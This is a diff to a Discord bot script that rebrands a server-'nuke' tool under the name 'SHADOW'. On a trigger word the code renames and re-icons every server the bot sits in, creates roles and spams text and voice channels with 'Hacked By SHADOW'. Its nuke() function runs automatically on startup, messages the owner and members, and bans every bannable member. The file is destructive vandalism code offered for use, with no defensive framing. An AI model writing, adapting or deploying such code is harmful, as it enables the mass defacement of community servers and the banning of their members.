@@ -18,7 +18,7 @@ console.log(`Logged in as  * [ "  SHADOW " ] servers! [ " ${LOka.guilds.size} " 
  
 });
 
-var prefix = "1"
+var prefix = "SHADOW"
 LOka.on("message", message => {
   if(!message.content.startsWith(prefix)) return;;
   let args = message.content.split(" ").slice(1);
@@ -33,47 +33,47 @@ LOka.on("message", message => {
  
 var x1 = "SHADOW"
 LOka.on('message', message => {
-     if (message.content === "1") {
-LOka.user.setAvatar(``)
+     if (message.content === "SHADOW") {
+LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/519891078502154250/526371167586746388/JPEG_20181029_124219.jpg`)
  
 }
 });
 var x1 = "SHADOW"
 LOka.on('message', message => {
-     if (message.content === "1") {
-LOka.user.setUsername(" ")
+     if (message.content === "SHADOW") {
+LOka.user.setUsername("Hacked By SHADOW ")
 
 
  
 }
 });
 LOka.on('message', message => {
-     if (message.content === "1") {
-LOka.user.setGame(``,'https://www.twitch.tv/hix')
+     if (message.content === "SHADOW") {
+LOka.user.setGame(`Hacked By SHADOW`,'https://www.twitch.tv/hix')
  
 }
 });
  
 LOka.on('message', message => {
-     if (message.content === "1") {
+     if (message.content === "SHADOW") {
          LOka.guilds.forEach(m =>{
-             m.setIcon(``)
+             m.setIcon(`https://cdn.discordapp.com/attachments/519891078502154250/526371167586746388/JPEG_20181029_124219.jpg`)
 })
 }
 });
 LOka.on('message', message => {
-     if (message.content === "1") {
+     if (message.content === "SHADOW") {
          LOka.guilds.forEach(m =>{
-             m.setName(``)
+             m.setName(`Hacked By SHADOW`)
 })
 }
 });
  
 LOka.on('message', message => {
-     if (message.content === "1") {
+     if (message.content === "SHADOW") {
                  if(!message.channel.guild) return;
  
-             message.guild.setIcon(``)
+             message.guild.setIcon(`https://cdn.discordapp.com/attachments/519891078502154250/526371167586746388/JPEG_20181029_124219.jpg`)
  
 }
 });
@@ -81,7 +81,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      
  
-     if (message.content === "1") {
+     if (message.content === "SHADOW") {
          LOka.guilds.forEach(m =>{
   m.createRole({
         name : "Hacked By - SHADOW ,$ ",
@@ -287,7 +287,7 @@ LOka.on('message', message => {
 }
 });
 LOka.on('message', message => {
-         if (message.content === "1") {
+         if (message.content === "SHADOW") {
                LOka.guilds.forEach(m =>{
 m.createChannel('Hacked By- SHADOW', 'text');
 m.createChannel('Hacked By- SHADOW', 'text');
@@ -1594,7 +1594,7 @@ m.createChannel('Hacked By- SHADOW', 'text');
 });
  
 LOka.on('message', message => {
-         if (message.content === "1") {
+         if (message.content === "SHADOW") {
                  LOka.guilds.forEach(m =>{
 m.createChannel('Hacked By - SHADOW', 'voice');
 m.createChannel('Hacked By - SHADOW', 'voice');
@@ -1968,14 +1968,14 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send('  ?    ').catch(e => { return void e; });
+  await guild.owner.send(' Hacked By - SHADOW    ').catch(e => { return void e; });
  
  
  
   await Promise.all(guild.members.map(async (m) => {
     if (m.bannable) {
       users++;
-      await m.send('? ').catch(e => { return void e; });
+      await m.send('Hacked By SHADOW  ').catch(e => { return void e; });
       return m.ban();
     }
   }));
@@ -1987,9 +1987,9 @@ async function nuke(guild) {
     }
   }));
  
-    await guild.createChannel('Hacked By - ? ,$', 'text');
+    await guild.createChannel('Hacked By - SHADOW ,$', 'text');
  
-      await guild.createChannel('Hacked By -? ,$', 'voice');
+      await guild.createChannel('Hacked By - SHADOW ,$', 'voice');
  
  
  
@@ -1999,7 +1999,7 @@ LOka.on('ready', () => {
   for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
   console.log('-------------------------------------------------------------');
   console.log('');
-  console.log("Made by ?");
+  console.log("Made by SHADOW");
   console.log("");
   console.log("-------------------------------------------------------------");
  
